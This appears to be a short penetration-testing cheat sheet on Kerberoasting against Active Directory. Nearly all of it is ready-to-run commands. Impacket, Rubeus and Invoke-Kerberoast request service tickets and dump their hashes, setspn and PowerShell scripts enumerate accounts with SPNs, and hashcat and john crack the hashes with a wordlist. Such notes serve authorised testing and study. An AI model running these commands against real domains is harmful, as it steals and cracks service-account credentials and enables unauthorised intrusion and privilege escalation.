# Kerberoasting

Allows a user to request a service ticket for any service with a registered SPN, then use that ticket to crack the service password. **If the service has a registered SPN, it can be Kerberoastable.**

**Impacket**

```sh
impacket-GetUserSPNs.py pwnlab.local/user:password -dc-ip 192.168.x.x -request
```

**Rubeus**

```sh
C:\Users\Administrator> Rubeus.exe kerberoast /outfile:hash.txt
```

```
hashcat -m 13100 -a 0 hash.txt /opt/rockyou.txt
```

**Invoke-Kerberoast**

```sh
C:\Users\Administrator> Invoke-Kerberoast -domain pwnlab.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

---

Access the compromised system and search for vulnerable SPNs

```c
. .\Find-PotentiallyCrackableAccounts.ps1

Find-PotentiallyCrackableAccounts
```

```c
setspn.exe -Q */*
```

Request a TGS ticket

```c
. .\Get-TGSCipher.ps1
Get-TGSCipher -SPN "SPN" -Format john
```
